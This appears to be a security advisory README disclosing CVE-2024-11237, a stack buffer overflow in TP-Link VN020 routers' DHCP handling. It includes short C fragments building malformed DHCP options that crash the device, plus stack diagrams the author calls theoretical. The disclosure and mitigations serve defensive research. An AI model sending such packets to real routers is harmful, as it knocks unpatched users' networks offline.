# TP-Link VN020 DHCP Memory Corruption (CVE-2024-11237)
## Critical Vulnerability in DHCP Packet Processing

### Overview
A critical vulnerability has been discovered in TP-Link VN020 F3v(T) routers running firmware version TT_V6.2.1021. The vulnerability allows remote attackers to trigger a stack-based buffer overflow through specially crafted DHCP DISCOVER packets, leading to denial of service (DoS) conditions.

**Affected Devices:**
- Router Model: TP-Link VN020-F3v(T)
- Firmware Version: TT_V6.2.1021
- Deployment: Primarily through Tunisie Telecom and Topnet ISPs
- Confirmed Variants: Also affects Algerian and Moroccan versions

> **Important Note:** Due to the proprietary nature of the firmware, the exact internal implementation details are unknown. This analysis is based on observed behavior and black-box testing.

### Vulnerability Details
- **CVE ID**: [CVE-2024-11237](https://www.cve.org/CVERecord?id=CVE-2024-11237)
- **Type**: Stack-based Buffer Overflow (CWE-121)
- **Attack Vector**: Remote (DHCP DISCOVER Packet)
- **Authentication**: None Required
- **Port**: UDP/67 (DHCP Server)
- **Impact**: DoS (Confirmed) & RCE (Possible)
- **Complexity**: Low

### Technical Analysis

#### DHCP Packet Structure
```
[Basic DHCP Header]
0x00: 01        ; BOOTREQUEST
0x01: 01        ; Hardware type (Ethernet)
0x02: 06        ; Hardware address length
0x03: 00        ; Hops
0x04-0x07: XID  ; Random transaction ID
0x08-0x09: 0000 ; Seconds elapsed
0x0A-0x0B: 8000 ; Flags (Broadcast)
0x0C-0x1F: 0000 ; Client/Server/Gateway IPs
0x20-0x28: MAC  ; Client hardware address
0x29-0x2C: 0000 ; Padding
```

#### Exploitation Vectors

1. **DHCP Hostname Processing**
```c
// Overflow trigger through hostname option
unsigned char long_hostname[128];
memset(long_hostname, 'A', sizeof(long_hostname) - 1);
long_hostname[127] = '\0';
add_option(packet, offset, 0x0C, 127, long_hostname);
```

2. **Vendor-Specific Option**
```c
// Vendor option manipulation
unsigned char vendor_specific[] = { 
    0x00, 0x14, 0x22,  // TP-Link vendor prefix
    0xFF, 0xFF, 0xFF   // Trigger condition
};
add_option(packet, offset, 0x2B, sizeof(vendor_specific), vendor_specific);
```

3. **Length Field Manipulation**
```c
// Claimed vs actual length mismatch
add_option(packet, offset, 0x3D, 0xFF, (unsigned char[]) { 0x01 });
```

### Potential Memory Corruption
While the exact internal implementation is unknown, the observed behavior suggests potential memory corruption issues:

**Normal DHCP Hostname Processing**
```
Stack Layout (Normal Case)
+------------------------+ Higher addresses
|     Previous Frame     |
+------------------------+
|   Return Address (4)   |
+------------------------+
|    Saved EBP (4)       |
+------------------------+
|                        |
|   Hostname Buffer      |
|      (64 bytes)        |
|                        |
+------------------------+ Lower addresses
|    Other Variables     |
+------------------------+
```

**What could potentially be happening inside the router?**
```
Stack Layout (Overflow Case)
+------------------------+ Higher addresses
|     Previous Frame     |
+------------------------+
|   Overwritten Return   | 
+------------------------+
|   Overwritten EBP      | <- Unknown state corruption
+------------------------+
|     Overflow Data      | <- 127 bytes of 'A'
|         ...            |
+------------------------+ Lower addresses
|    Other Variables     | <- Potentially corrupted
+------------------------+
```
This is theoretical, and certain details may not be entirely accurate, as TP-Link provides the firmware for this router exclusively to ISPs.

#### Video Demonstration
https://github.com/user-attachments/assets/ed897aed-540e-4ad8-8f70-788b264036bd

https://github.com/user-attachments/assets/46c6a5f0-c693-4a68-acbb-058fd1113fb6

Router may also try to restart it self as shown here due to the crash as shown here: 

https://github.com/user-attachments/assets/0e2d2905-74ac-4829-b127-538f2d159d0d

### Observed Impact
- Immediate device unresponsiveness
- DHCP service failure
- Automatic router restart
- Network disruption requiring manual intervention

### Timeline
- **Initial Discovery**: October 20, 2024
- **Vendor Notification**: November 3, 2024
- **CVE Assignment**: November 15, 2024


### Mitigation
No official patch is currently available. Temporary mitigations include:
1. Disable DHCP server if not required
2. Implement DHCP traffic filtering at network edge
3. Consider alternative router models if possible

### References
1. [CVE-2024-11237](https://www.cve.org/CVERecord?id=CVE-2024-11237)
2. [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)

### Researcher
**Mohamed Maatallah**
- GitHub: [@Zephkek](https://github.com/Zephkek)
- Affiliation: Independent Security Researcher

